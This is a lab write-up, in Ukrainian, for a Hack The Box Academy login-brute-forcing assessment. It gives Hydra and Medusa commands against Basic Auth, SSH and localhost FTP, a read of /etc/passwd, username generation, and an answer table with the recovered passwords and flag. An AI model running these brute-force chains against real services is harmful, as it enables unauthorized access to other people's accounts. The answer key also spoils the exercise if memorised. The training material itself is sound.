# Skills Assessment — Login Brute Forcing (Part 1 + 2)

## Модуль
- [Part 1](https://academy.hackthebox.com/app/module/57/section/515)
- [Part 2](https://academy.hackthebox.com/app/module/57/section/516)

## Концепція

Дворівневий ланцюг:
1. **Basic Auth** брутфорс → отримати username для Part 2
2. **SSH** брутфорс → зайти на машину → знайти OSINT + wordlist →
   **FTP** брутфорс на localhost → забрати флаг

---

## Part 1 — Basic Auth Brute Force

### Крок 1 — Розвідка

```bash
curl -v http://TARGET:PORT/ 2>&1 | grep -i "WWW-Authenticate\|401"
# → WWW-Authenticate: Basic realm="Restricted"
```

### Крок 2 — Завантажити wordlists

```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
```

### Крок 3 — Hydra Basic Auth

```bash
hydra -L top-usernames-shortlist.txt \
  -P 2023-200_most_used_passwords.txt \
  TARGET_IP http-get / -s TARGET_PORT -t 16 -f
```
FOUND: login: admin password: Admin123

### Крок 4 — Отримати username для Part 2

```bash
curl -s -u "admin:Admin123" http://TARGET_IP:TARGET_PORT/
# → username: satwossh
```

---

## Part 2 — SSH → FTP Chain

### Крок 1 — SSH брутфорс (Medusa)

```bash
medusa -h TARGET_IP -n TARGET_PORT -u satwossh \
  -P 2023-200_most_used_passwords.txt -M ssh -t 3
```
FOUND: User: satwossh Password: password1

### Крок 2 — SSH логін + розвідка

```bash
ssh satwossh@TARGET_IP -p TARGET_PORT
# password: password1

# Знайти FTP юзера
cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1
# → root, sync, satwossh, thomas

# OSINT з IncidentReport.txt — підозрюваний: Thomas Smith
cat ~/IncidentReport.txt
# → "Thomas Smith has been regularly uploading files to the FTP server"

# Готовий wordlist на машині
cat ~/passwords.txt   # → 198 паролів
```

### Крок 3 — Генерація username варіантів

```bash
~/username-anarchy/username-anarchy Thomas Smith > thomas_usernames.txt
# → thomas, thomassmith, thomas.smith, t.smith, tsmith...
```

### Крок 4 — FTP брутфорс на localhost

```bash
medusa -h 127.0.0.1 \
  -U thomas_usernames.txt \
  -P ~/passwords.txt \
  -M ftp -t 3 -f
```
FOUND: User: thomas Password: chocolate!

### Крок 5 — FTP логін + флаг

```bash
ftp -n 127.0.0.1 <<EOF
user thomas chocolate!
ls
get flag.txt /tmp/flag.txt
bye
EOF

cat /tmp/flag.txt
```

**Flag:** `HTB{brut3f0rc1ng_succ3ssful}`

---

## Відповіді на запитання

| Part | Q | Answer |
|------|---|--------|
| Part 1 | Q1 — Password for basic auth | `Admin123` |
| Part 1 | Q2 — Username for Part 2 | `satwossh` |
| Part 2 | Q1 — FTP username | `thomas` |
| Part 2 | Q2 — Flag in flag.txt | `HTB{brut3f0rc1ng_succ3ssful}` |

---

## Ключові моменти

| # | Що важливо |
|---|-----------|
| 1 | Basic Auth → `http-get /` в Hydra, не `http-post-form` |
| 2 | OSINT всередині машини — завжди читати txt файли в home |
| 3 | FTP тільки на localhost — брутфорс запускати з SSH сесії |
| 4 | Wordlist може лежати прямо на машині — `passwords.txt` в home |
| 5 | username-anarchy може бути вже встановлений в home директорії |
